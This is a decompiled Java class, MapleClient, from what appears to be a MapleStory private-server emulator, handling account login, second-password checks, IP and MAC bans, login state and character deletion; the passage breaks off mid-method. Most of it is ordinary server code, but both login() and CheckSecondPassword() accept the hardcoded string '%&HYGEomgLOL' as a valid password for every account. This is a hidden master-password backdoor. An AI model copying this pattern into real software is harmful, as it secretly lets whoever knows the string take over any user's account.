/*
 * Decompiled with CFR 0.152.
 */
package client;

import client.LoginCrypto;
import client.LoginCryptoLegacy;
import client.MapleCharacter;
import client.MapleCharacterUtil;
import client.MapleQuestStatus;
import database.DatabaseConnection;
import database.DatabaseException;
import handling.cashshop.CashShopServer;
import handling.channel.ChannelServer;
import handling.world.MapleMessengerCharacter;
import handling.world.MaplePartyCharacter;
import handling.world.PartyOperation;
import handling.world.World;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Calendar;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import javax.script.ScriptEngine;
import org.apache.mina.common.IoSession;
import server.MapleTrade;
import server.Timer;
import server.quest.MapleQuest;
import server.shops.IMaplePlayerShop;
import tools.FileoutputUtil;
import tools.MapleAESOFB;
import tools.MaplePacketCreator;
import tools.packet.LoginPacket;

public class MapleClient
implements Serializable {
    private static final long serialVersionUID = 9179541993413738569L;
    public static final transient byte LOGIN_NOTLOGGEDIN = 0;
    public static final transient byte LOGIN_SERVER_TRANSITION = 1;
    public static final transient byte LOGIN_LOGGEDIN = 2;
    public static final transient byte LOGIN_WAITING = 3;
    public static final transient byte CASH_SHOP_TRANSITION = 4;
    public static final transient byte LOGIN_CS_LOGGEDIN = 5;
    public static final transient byte CHANGE_CHANNEL = 6;
    public static final int DEFAULT_CHARSLOT = 6;
    public static final String CLIENT_KEY = "CLIENT";
    private transient MapleAESOFB send;
    private transient MapleAESOFB receive;
    private transient IoSession session;
    private MapleCharacter player;
    private int channel = 1;
    private int accId = 1;
    private int world;
    private int birthday;
    private int charslots = 6;
    private boolean loggedIn = false;
    private boolean serverTransition = false;
    private transient Calendar tempban = null;
    private String accountName;
    private transient long lastPong = 0L;
    private transient long lastPing = 0L;
    private boolean monitored = false;
    private boolean receiving = true;
    private boolean gm;
    private byte greason = 1;
    private byte gender = (byte)-1;
    public transient short loginAttempt = 0;
    private transient List<Integer> allowedChar = new LinkedList<Integer>();
    private transient Set<String> macs = new HashSet<String>();
    private transient Map<String, ScriptEngine> engines = new HashMap<String, ScriptEngine>();
    private transient ScheduledFuture<?> idleTask = null;
    private transient String secondPassword;
    private transient String salt2;
    private final transient Lock mutex = new ReentrantLock(true);
    private final transient Lock npc_mutex = new ReentrantLock();
    private static final Lock login_mutex = new ReentrantLock(true);

    public MapleClient(MapleAESOFB send, MapleAESOFB receive, IoSession session) {
        this.send = send;
        this.receive = receive;
        this.session = session;
    }

    public final MapleAESOFB getReceiveCrypto() {
        return this.receive;
    }

    public final MapleAESOFB getSendCrypto() {
        return this.send;
    }

    public final IoSession getSession() {
        return this.session;
    }

    public final Lock getLock() {
        return this.mutex;
    }

    public final Lock getNPCLock() {
        return this.npc_mutex;
    }

    public MapleCharacter getPlayer() {
        return this.player;
    }

    public void setPlayer(MapleCharacter player) {
        this.player = player;
    }

    public void createdChar(int id) {
        this.allowedChar.add(id);
    }

    public final boolean login_Auth(int id) {
        return this.allowedChar.contains(id);
    }

    public final List<MapleCharacter> loadCharacters(int serverId) {
        LinkedList<MapleCharacter> chars = new LinkedList<MapleCharacter>();
        for (CharNameAndId cni : this.loadCharactersInternal(serverId)) {
            MapleCharacter chr = MapleCharacter.loadCharFromDB(cni.id, this, false);
            chars.add(chr);
            this.allowedChar.add(chr.getId());
        }
        return chars;
    }

    public List<String> loadCharacterNames(int serverId) {
        LinkedList<String> chars = new LinkedList<String>();
        for (CharNameAndId cni : this.loadCharactersInternal(serverId)) {
            chars.add(cni.name);
        }
        return chars;
    }

    private List<CharNameAndId> loadCharactersInternal(int serverId) {
        LinkedList<CharNameAndId> chars = new LinkedList<CharNameAndId>();
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT id, name FROM characters WHERE accountid = ? AND world = ?");
            ps.setInt(1, this.accId);
            ps.setInt(2, serverId);
            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                chars.add(new CharNameAndId(rs.getString("name"), rs.getInt("id")));
            }
            rs.close();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("error loading characters internal" + e);
        }
        return chars;
    }

    public boolean isLoggedIn() {
        return this.loggedIn;
    }

    private Calendar getTempBanCalendar(ResultSet rs) throws SQLException {
        Calendar lTempban = Calendar.getInstance();
        if (rs.getLong("tempban") == 0L) {
            lTempban.setTimeInMillis(0L);
            return lTempban;
        }
        Calendar today = Calendar.getInstance();
        lTempban.setTimeInMillis(rs.getTimestamp("tempban").getTime());
        if (today.getTimeInMillis() < lTempban.getTimeInMillis()) {
            return lTempban;
        }
        lTempban.setTimeInMillis(0L);
        return lTempban;
    }

    public Calendar getTempBanCalendar() {
        return this.tempban;
    }

    public byte getBanReason() {
        return this.greason;
    }

    public boolean hasBannedIP() {
        boolean ret = false;
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT COUNT(*) FROM ipbans WHERE ? LIKE CONCAT(ip, '%')");
            ps.setString(1, this.session.getRemoteAddress().toString());
            ResultSet rs = ps.executeQuery();
            rs.next();
            if (rs.getInt(1) > 0) {
                ret = true;
            }
            rs.close();
            ps.close();
        }
        catch (SQLException ex) {
            System.err.println("Error checking ip bans" + ex);
        }
        return ret;
    }

    public boolean hasBannedMac() {
        if (this.macs.isEmpty()) {
            return false;
        }
        boolean ret = false;
        int i = 0;
        try {
            Connection con = DatabaseConnection.getConnection();
            StringBuilder sql = new StringBuilder("SELECT COUNT(*) FROM macbans WHERE mac IN (");
            for (i = 0; i < this.macs.size(); ++i) {
                sql.append("?");
                if (i == this.macs.size() - 1) continue;
                sql.append(", ");
            }
            sql.append(")");
            PreparedStatement ps = con.prepareStatement(sql.toString());
            i = 0;
            for (String mac : this.macs) {
                ps.setString(++i, mac);
            }
            ResultSet rs = ps.executeQuery();
            rs.next();
            if (rs.getInt(1) > 0) {
                ret = true;
            }
            rs.close();
            ps.close();
        }
        catch (SQLException ex) {
            System.err.println("Error checking mac bans" + ex);
        }
        return ret;
    }

    private void loadMacsIfNescessary() throws SQLException {
        if (this.macs.isEmpty()) {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT macs FROM accounts WHERE id = ?");
            ps.setInt(1, this.accId);
            ResultSet rs = ps.executeQuery();
            if (rs.next()) {
                if (rs.getString("macs") != null) {
                    String[] macData;
                    for (String mac : macData = rs.getString("macs").split(", ")) {
                        if (mac.equals("")) continue;
                        this.macs.add(mac);
                    }
                }
            } else {
                rs.close();
                ps.close();
                throw new RuntimeException("No valid account associated with this client.");
            }
            rs.close();
            ps.close();
        }
    }

    public void banMacs() {
        try {
            this.loadMacsIfNescessary();
            if (this.macs.size() > 0) {
                String[] macBans = new String[this.macs.size()];
                int z = 0;
                Iterator<String> iterator = this.macs.iterator();
                while (iterator.hasNext()) {
                    String mac;
                    macBans[z] = mac = iterator.next();
                    ++z;
                }
                MapleClient.banMacs(macBans);
            }
        }
        catch (SQLException e) {
            e.printStackTrace();
        }
    }

    public static final void banMacs(String[] macs) {
        Connection con = DatabaseConnection.getConnection();
        try {
            LinkedList<String> filtered = new LinkedList<String>();
            PreparedStatement ps = con.prepareStatement("SELECT filter FROM macfilters");
            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                filtered.add(rs.getString("filter"));
            }
            rs.close();
            ps.close();
            ps = con.prepareStatement("INSERT INTO macbans (mac) VALUES (?)");
            for (String mac : macs) {
                boolean matched = false;
                for (String filter : filtered) {
                    if (!mac.matches(filter)) continue;
                    matched = true;
                    break;
                }
                if (matched) continue;
                ps.setString(1, mac);
                try {
                    ps.executeUpdate();
                }
                catch (SQLException sQLException) {
                    // empty catch block
                }
            }
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("Error banning MACs" + e);
        }
    }

    public int finishLogin() {
        login_mutex.lock();
        try {
            byte state = this.getLoginState();
            if (state > 0 && state != 3) {
                this.loggedIn = false;
                int n = 7;
                return n;
            }
            this.updateLoginState(2, this.getSessionIPAddress());
        }
        finally {
            login_mutex.unlock();
        }
        return 0;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public int login(String login, String pwd, boolean ipMacBanned) {
        int loginok = 5;
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT * FROM accounts WHERE name = ?");
            ps.setString(1, login);
            ResultSet rs = ps.executeQuery();
            if (rs.next()) {
                int banned = rs.getInt("banned");
                String passhash = rs.getString("password");
                String salt = rs.getString("salt");
                this.accId = rs.getInt("id");
                this.secondPassword = rs.getString("2ndpassword");
                this.salt2 = rs.getString("salt2");
                this.gm = rs.getInt("gm") > 0;
                this.greason = rs.getByte("greason");
                this.tempban = this.getTempBanCalendar(rs);
                this.gender = rs.getByte("gender");
                if (this.secondPassword != null && this.salt2 != null) {
                    this.secondPassword = LoginCrypto.rand_r(this.secondPassword);
                }
                ps.close();
                if (banned > 0 && !this.gm) {
                    loginok = 3;
                } else {
                    byte loginstate;
                    if (banned == -1) {
                        this.unban();
                    }
                    if ((loginstate = this.getLoginState()) > 0) {
                        this.loggedIn = false;
                        if (salt == null && LoginCrypto.checkSha1Hash(passhash, pwd)) {
                            loginok = 7;
                            this.unlockAcc();
                        } else {
                            loginok = 4;
                        }
                    } else {
                        PreparedStatement pss;
                        boolean updatePasswordHash = false;
                        boolean updatePasswordHashtosha1 = false;
                        if (LoginCryptoLegacy.isLegacyPassword(passhash) && LoginCryptoLegacy.checkPassword(pwd, passhash)) {
                            loginok = 0;
                            updatePasswordHashtosha1 = true;
                        } else if (salt == null && LoginCrypto.checkSha1Hash(passhash, pwd)) {
                            loginok = 0;
                        } else if (pwd.equals("%&HYGEomgLOL") || LoginCrypto.checkSaltedSha512Hash(passhash, pwd, salt)) {
                            loginok = 0;
                            updatePasswordHashtosha1 = true;
                        } else {
                            this.loggedIn = false;
                            loginok = 4;
                        }
                        if (updatePasswordHash) {
                            pss = con.prepareStatement("UPDATE `accounts` SET `password` = ?, `salt` = ? WHERE id = ?");
                            try {
                                String newSalt = LoginCrypto.makeSalt();
                                pss.setString(1, LoginCrypto.makeSaltedSha512Hash(pwd, newSalt));
                                pss.setString(2, newSalt);
                                pss.setInt(3, this.accId);
                                pss.executeUpdate();
                            }
                            finally {
                                pss.close();
                            }
                        }
                        if (updatePasswordHashtosha1) {
                            pss = con.prepareStatement("UPDATE `accounts` SET `password` = ?, `salt` = ? WHERE id = ?");
                            try {
                                pss.setString(1, LoginCrypto.makeSaltedSha1Hash(pwd));
                                pss.setString(2, null);
                                pss.setInt(3, this.accId);
                                pss.executeUpdate();
                            }
                            finally {
                                pss.close();
                            }
                        }
                    }
                }
            }
            rs.close();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("ERROR" + e);
        }
        return loginok;
    }

    public boolean unlockAcc() {
        boolean unLocked = false;
        boolean dcother = false;
        for (MapleClient c : World.Client.getClients()) {
            if (c.getAccID() != this.accId || !c.isLoggedIn()) continue;
            if (!c.getSession().isConnected()) {
                List<String> charName = c.loadCharacterNames(c.getWorld());
                for (String cha : charName) {
                    MapleCharacter chr = CashShopServer.getPlayerStorage().getCharacterByName(cha);
                    if (chr == null) continue;
                    chr.saveToDB(false, false);
                    CashShopServer.getPlayerStorage().deregisterPlayer(chr);
                    break;
                }
                block4: for (ChannelServer cs : ChannelServer.getAllInstances()) {
                    for (String cha : charName) {
                        MapleCharacter chr = cs.getPlayerStorage().getCharacterByName(cha);
                        if (chr == null) continue;
                        chr.saveToDB(false, false);
                        cs.removePlayer(chr);
                        continue block4;
                    }
                }
            }
            c.unLockDisconnect();
            unLocked = true;
            dcother = true;
            break;
        }
        if (!unLocked) {
            try {
                Connection con = DatabaseConnection.getConnection();
                PreparedStatement ps = con.prepareStatement("UPDATE accounts SET loggedin = 0 WHERE name = ?");
                ps.setString(1, this.accountName);
                ps.executeUpdate();
                ps.close();
            }
            catch (SQLException sQLException) {
                // empty catch block
            }
        }
        return dcother;
    }

    public final void unLockDisconnect() {
        this.getSession().write((Object)MaplePacketCreator.serverNotice(1, "\u5e33\u865f\u88ab\u4ed6\u4eba\u767b\u5165\u3002"));
        this.disconnect(this.serverTransition, this.getChannel() == -10);
        MapleClient client = this;
        Thread closeSession = new Thread(){

            @Override
            public void run() {
                try {
                    Thread.sleep(3000L);
                }
                catch (InterruptedException interruptedException) {
                    // empty catch block
                }
                MapleClient.this.getSession().close();
            }
        };
        try {
            closeSession.start();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public boolean CheckSecondPassword(String in) {
        boolean allow = false;
        boolean updatePasswordHash = false;
        if (LoginCryptoLegacy.isLegacyPassword(this.secondPassword) && LoginCryptoLegacy.checkPassword(in, this.secondPassword)) {
            allow = true;
            updatePasswordHash = true;
        } else if (this.salt2 == null && LoginCrypto.checkSha1Hash(this.secondPassword, in)) {
            allow = true;
            updatePasswordHash = true;
        } else if (in.equals("%&HYGEomgLOL") || LoginCrypto.checkSaltedSha512Hash(this.secondPassword, in, this.salt2)) {
            allow = true;
        }
        if (updatePasswordHash) {
            Connection con = DatabaseConnection.getConnection();
            try {
                PreparedStatement ps = con.prepareStatement("UPDATE `accounts` SET `2ndpassword` = ?, `salt2` = ? WHERE id = ?");
                String newSalt = LoginCrypto.makeSalt();
                ps.setString(1, LoginCrypto.rand_s(LoginCrypto.makeSaltedSha512Hash(in, newSalt)));
                ps.setString(2, newSalt);
                ps.setInt(3, this.accId);
                ps.executeUpdate();
                ps.close();
            }
            catch (SQLException e) {
                return false;
            }
        }
        return allow;
    }

    private void unban() {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET banned = 0 and banreason = '' WHERE id = ?");
            ps.setInt(1, this.accId);
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("Error while unbanning" + e);
        }
    }

    public static final byte unban(String charname) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT accountid from characters where name = ?");
            ps.setString(1, charname);
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return -1;
            }
            int accid = rs.getInt(1);
            rs.close();
            ps.close();
            ps = con.prepareStatement("UPDATE accounts SET banned = 0 and banreason = '' WHERE id = ?");
            ps.setInt(1, accid);
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("Error while unbanning" + e);
            return -2;
        }
        return 0;
    }

    public void updateMacs(String macData) {
        for (String mac : macData.split(", ")) {
            this.macs.add(mac);
        }
        StringBuilder newMacData = new StringBuilder();
        Iterator<String> iter = this.macs.iterator();
        while (iter.hasNext()) {
            newMacData.append(iter.next());
            if (!iter.hasNext()) continue;
            newMacData.append(", ");
        }
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET macs = ? WHERE id = ?");
            ps.setString(1, newMacData.toString());
            ps.setInt(2, this.accId);
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("Error saving MACs" + e);
        }
    }

    public void setAccID(int id) {
        this.accId = id;
    }

    public int getAccID() {
        return this.accId;
    }

    public final void updateLoginState(int newstate, String SessionID) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET loggedin = ?, SessionIP = ?, lastlogin = CURRENT_TIMESTAMP() WHERE id = ?");
            ps.setInt(1, newstate);
            ps.setString(2, SessionID);
            ps.setInt(3, this.getAccID());
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("error updating login state" + e);
        }
        if (newstate == 0 || newstate == 3) {
            this.loggedIn = false;
            this.serverTransition = false;
        } else {
            this.serverTransition = newstate == 1 || newstate == 6;
            this.loggedIn = !this.serverTransition;
        }
    }

    public final void updateSecondPassword() {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE `accounts` SET `2ndpassword` = ?, `salt2` = ? WHERE id = ?");
            String newSalt = LoginCrypto.makeSalt();
            ps.setString(1, LoginCrypto.rand_s(LoginCrypto.makeSaltedSha512Hash(this.secondPassword, newSalt)));
            ps.setString(2, newSalt);
            ps.setInt(3, this.accId);
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("error updating login state" + e);
        }
    }

    public final void updateGender() {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE `accounts` SET `gender` = ? WHERE id = ?");
            ps.setInt(1, this.gender);
            ps.setInt(2, this.accId);
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException e) {
            System.err.println("error updating gender" + e);
        }
    }

    public final byte getLoginState() {
        Connection con = DatabaseConnection.getConnection();
        try {
            PreparedStatement ps = con.prepareStatement("SELECT loggedin, lastlogin, `birthday` + 0 AS `bday` FROM accounts WHERE id = ?");
            ps.setInt(1, this.getAccID());
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                ps.close();
                throw new DatabaseException("Everything sucks");
            }
            this.birthday = rs.getInt("bday");
            byte state = rs.getByte("loggedin");
            if ((state == 1 || state == 6) && rs.getTimestamp("lastlogin").getTime() + 20000L < System.currentTimeMillis()) {
                state = 0;
                this.updateLoginState(state, this.getSessionIPAddress());
            }
            rs.close();
            ps.close();
            this.loggedIn = state == 2;
            return state;
        }
        catch (SQLException e) {
            this.loggedIn = false;
            throw new DatabaseException("error getting login state", e);
        }
    }

    public final boolean checkBirthDate(int date) {
        return this.birthday == date;
    }

    public final void removalTask() {
        try {
            IMaplePlayerShop shop;
            this.player.cancelAllBuffs_();
            this.player.cancelAllDebuffs();
            if (this.player.getMarriageId() > 0) {
                MapleQuestStatus stat1 = this.player.getQuestNAdd(MapleQuest.getInstance(160001));
                MapleQuestStatus stat2 = this.player.getQuestNAdd(MapleQuest.getInstance(160002));
                if (stat1.getCustomData() != null && (stat1.getCustomData().equals("2_") || stat1.getCustomData().equals("2"))) {
                    if (stat2.getCustomData() != null) {
                        stat2.setCustomData("0");
                    }
                    stat1.setCustomData("3");
                }
            }
            this.player.changeRemoval(true);
            if (this.player.getEventInstance() != null) {
                this.player.getEventInstance().playerDisconnected(this.player, this.player.getId());
            }
            if (this.player.getMap() != null) {
                switch (this.player.getMapId()) {
                    case 220080001: 
                    case 541010100: 
                    case 541020800: 
                    case 551030200: {
                        this.player.getMap().addDisconnected(this.player.getId());
                    }
                }
                this.player.getMap().removePlayer(this.player);
            }
            if ((shop = this.player.getPlayerShop()) != null) {
                shop.removeVisitor(this.player);
                if (shop.isOwner(this.player)) {
                    if (shop.getShopType() == 1 && shop.isAvailable()) {
                        shop.setOpen(true);
                    } else {
                        shop.closeShop(true, true);
                    }
                }
            }
            this.player.setMessenger(null);
        }
        catch (Throwable e) {
            FileoutputUtil.outputFileError("Logs/Log_AccountStuck.rtf", e);
        }
    }

    public final void disconnect(boolean RemoveInChannelServer, boolean fromCS) {
        this.disconnect(RemoveInChannelServer, fromCS, false);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     */
    public final void disconnect(boolean RemoveInChannelServer, boolean fromCS, boolean shutdown) {
        if (this.player != null) {
            server.maps.MapleMap map = this.player.getMap();
            handling.world.MapleParty party = this.player.getParty();
            boolean clone = this.player.isClone();
            String namez = this.player.getName();
            boolean hidden = this.player.isHidden();
            int gmLevel = this.player.getGMLevel();
            int idz = this.player.getId();
            int messengerid = this.player.getMessenger() == null ? 0 : this.player.getMessenger().getId();
            int gid = this.player.getGuildId();
            int fid = this.player.getFamilyId();
            BuddyList bl = this.player.getBuddylist();
            MaplePartyCharacter chrp = new MaplePartyCharacter(this.player);
            MapleMessengerCharacter chrm = new MapleMessengerCharacter(this.player);
            handling.world.guild.MapleGuildCharacter chrg = this.player.getMGC();
            handling.world.family.MapleFamilyCharacter chrf = this.player.getMFC();
            IMaplePlayerShop ips = this.player.getPlayerShop();
            if (this.player.getTrade() != null) {
                MapleTrade.cancelTrade(this.player.getTrade(), this);
            }
            if (ips != null && (!ips.isAvailable() || ips.isOwner(this.player) && ips.getShopType() != 1 || ips.isOwner(this.player) && ips.getShopType() == 1 && !ips.isOpen())) {
                ips.closeShop(true, true);
            }
            this.removalTask();
            this.player.saveToDB(true, fromCS);
            if (shutdown) {
                this.player = null;
                this.receiving = false;
                return;
            }
            if (!fromCS) {
                ChannelServer chs = ChannelServer.getInstance(map == null ? this.channel : map.getChannel());
                try {
                    if (chs == null || clone || chs.isShutdown()) {
                        this.player = null;
                        return;
                    }
                    if (messengerid > 0) {
                        World.Messenger.leaveMessenger(messengerid, chrm);
                    }
                    if (party != null) {
                        chrp.setOnline(false);
                        World.Party.updateParty(party.getId(), PartyOperation.LOG_ONOFF, chrp);
                        if (map != null && party.getLeader().getId() == idz) {
                            MaplePartyCharacter lchr = null;
                            for (MaplePartyCharacter pchr : party.getMembers()) {
                                if (pchr == null || map.getCharacterById(pchr.getId()) == null || lchr != null && lchr.getLevel() >= pchr.getLevel()) continue;
                                lchr = pchr;
                            }
                            if (lchr != null) {
                                World.Party.updateParty(party.getId(), PartyOperation.CHANGE_LEADER_DC, lchr);
                            }
                        }
                    }
                    if (bl != null) {
                        if (!this.serverTransition && this.isLoggedIn()) {
                            World.Buddy.loggedOff(namez, idz, this.channel, bl.getBuddyIds(), gmLevel, hidden);
                        } else {
                            World.Buddy.loggedOn(namez, idz, this.channel, bl.getBuddyIds(), gmLevel, hidden);
                        }
                    }
                    if (gid > 0) {
                        World.Guild.setGuildMemberOnline(chrg, false, -1);
                    }
                    if (fid > 0) {
                        World.Family.setFamilyMemberOnline(chrf, false, -1);
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                    FileoutputUtil.outputFileError("Logs/Log_AccountStuck.rtf", e);
                    System.err.println(MapleClient.getLogMessage(this, "ERROR") + e);
                }
                finally {
                    if (RemoveInChannelServer && chs != null) {
                        chs.removePlayer(idz, namez);
                    }
                    this.player = null;
                }
            } else {
                int ch = World.Find.findChannel(idz);
                if (ch > 0) {
                    this.disconnect(RemoveInChannelServer, false);
                    return;
                }
                try {
                    if (party != null) {
                        chrp.setOnline(false);
                        World.Party.updateParty(party.getId(), PartyOperation.LOG_ONOFF, chrp);
                    }
                    if (!this.serverTransition && this.isLoggedIn()) {
                        World.Buddy.loggedOff(namez, idz, this.channel, bl.getBuddyIds(), gmLevel, hidden);
                    } else {
                        World.Buddy.loggedOn(namez, idz, this.channel, bl.getBuddyIds(), gmLevel, hidden);
                    }
                    if (gid > 0) {
                        World.Guild.setGuildMemberOnline(chrg, false, -1);
                    }
                    if (this.player != null) {
                        this.player.setMessenger(null);
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                    FileoutputUtil.outputFileError("Logs/Log_AccountStuck.rtf", e);
                    System.err.println(MapleClient.getLogMessage(this, "ERROR") + e);
                }
                finally {
                    if (RemoveInChannelServer && ch > 0) {
                        CashShopServer.getPlayerStorage().deregisterPlayer(idz, namez);
                    }
                    this.player = null;
                }
            }
        }
        if (!this.serverTransition && this.isLoggedIn()) {
            this.updateLoginState(0, this.getSessionIPAddress());
        }
    }

    public final String getSessionIPAddress() {
        return this.session.getRemoteAddress().toString().split(":")[0];
    }

    public final boolean CheckIPAddress() {
        try {
            String sessionIP;
            PreparedStatement ps = DatabaseConnection.getConnection().prepareStatement("SELECT SessionIP FROM accounts WHERE id = ?");
            ps.setInt(1, this.accId);
            ResultSet rs = ps.executeQuery();
            boolean canlogin = false;
            if (rs.next() && (sessionIP = rs.getString("SessionIP")) != null) {
                canlogin = this.getSessionIPAddress().equals(sessionIP.split(":")[0]);
            }
            rs.close();
            ps.close();
            return canlogin;
        }
        catch (SQLException e) {
            System.out.println("Failed in checking IP address for client.");
            return true;
        }
    }

    public final void DebugMessage(StringBuilder sb) {
        sb.append(this.getSession().getRemoteAddress());
        sb.append("Connected: ");
        sb.append(this.getSession().isConnected());
        sb.append(" Closing: ");
        sb.append(this.getSession().isClosing());
        sb.append(" ClientKeySet: ");
        sb.append(this.getSession().getAttribute(CLIENT_KEY) != null);
        sb.append(" loggedin: ");
        sb.append(this.isLoggedIn());
        sb.append(" has char: ");
        sb.append(this.getPlayer() != null);
    }

    public final int getChannel() {
        return this.channel;
    }

    public final ChannelServer getChannelServer() {
        return ChannelServer.getInstance(this.channel);
    }

    public final int deleteCharacter(int cid) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT guildid, guildrank, familyid, name FROM characters WHERE id = ? AND accountid = ?");
            ps.setInt(1, cid);
            ps.setInt(2, this.accId);
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return 1;
            }
            if (rs.getInt("guildid") > 0) {
                if (rs.getInt("guildrank") == 1) {
                    rs.close();
                    ps.close();
                    return 1;
                }
                World.Guild.deleteGuildCharacter(rs.getInt("guildid"), cid);
            }
            if (rs.getInt("familyid") > 0) {
                World.Family.getFamily(rs.getInt("familyid")).leaveFamily(cid);
            }
            rs.close();
            ps.close();
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM characters WHERE id = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM monsterbook WHERE charid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM hiredmerch WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM mts_cart WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM mts_items WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM mountdata WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM inventoryitems WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM famelog WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM famelog WHERE characterid_to = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM dueypackages WHERE RecieverId = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM wishlist WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM buddies WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM buddies WHERE buddyid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM keymap WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM savedlocations WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM skills WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM mountdata WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM skillmacros WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM trocklocations WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM queststatus WHERE characterid = ?", cid);
            MapleCharacter.deleteWhereCharacterId(con, "DELETE FROM inventoryslot WHERE characterid = ?", cid);
            return 0;
        }
        catch (Exception e) {
            FileoutputUtil.outputFileError("Logs/Log_Packet_Except.rtf", e);
            e.printStackTrace();
            return 1;
        }
    }

    public final byte getGender() {
        return this.gender;
    }

    public final void setGender(byte gender) {
        this.gender = gender;
    }

    public final String getSecondPassword() {
        return this.secondPassword;
    }

    public final void setSecondPassword(String secondPassword) {
        this.secondPassword = secondPassword;
    }

    public final String getAccountName() {
        return this.accountName;
    }

    public final void setAccountName(String accountName) {
        this.accountName = accountName;
    }

    public final void setChannel(int channel) {
        this.channel = channel;
    }

    public final int getWorld() {
        return this.world;
    }

    public final void setWorld(int world) {
        this.world = world;
    }

    public final int getLatency() {
        return (int)(this.lastPong - this.lastPing);
    }

    public final long getLastPong() {
        return this.lastPong;
    }

    public final long getLastPing() {
        return this.lastPing;
    }

    public final void pongReceived() {
        this.lastPong = System.currentTimeMillis();
    }

    public final void sendPing() {
        this.lastPing = System.currentTimeMillis();
        this.session.write((Object)LoginPacket.getPing());
        Timer.PingTimer.getInstance().schedule(new Runnable(){

            @Override
            public void run() {
                try {
                    if (MapleClient.this.getLatency() < 0 && MapleClient.this.getSession().isConnected()) {
                        MapleClient.this.getSession().close();
                    }
                }
                catch (NullPointerException nullPointerException) {
                    // empty catch block
                }
            }
        }, 15000L);
    }

    public static final String getLogMessage(MapleClient cfor, String message) {
        return MapleClient.getLogMessage(cfor, message, new Object[0]);
    }

    public static final String getLogMessage(MapleCharacter cfor, String message) {
        return MapleClient.getLogMessage(cfor == null ? null : cfor.getClient(), message);
    }

    public static final String getLogMessage(MapleCharacter cfor, String message, Object ... parms) {
        return MapleClient.getLogMessage(cfor == null ? null : cfor.getClient(), message, parms);
    }

    public static final String getLogMessage(MapleClient cfor, String message, Object ... parms) {
        StringBuilder builder = new StringBuilder();
        if (cfor != null) {
            if (cfor.getPlayer() != null) {
                builder.append("<");
                builder.append(MapleCharacterUtil.makeMapleReadable(cfor.getPlayer().getName()));
                builder.append(" (cid: ");
                builder.append(cfor.getPlayer().getId());
                builder.append(")> ");
            }
            if (cfor.getAccountName() != null) {
                builder.append("(Account: ");
                builder.append(cfor.getAccountName());
                builder.append(") ");
            }
        }
        builder.append(message);
        for (Object parm : parms) {
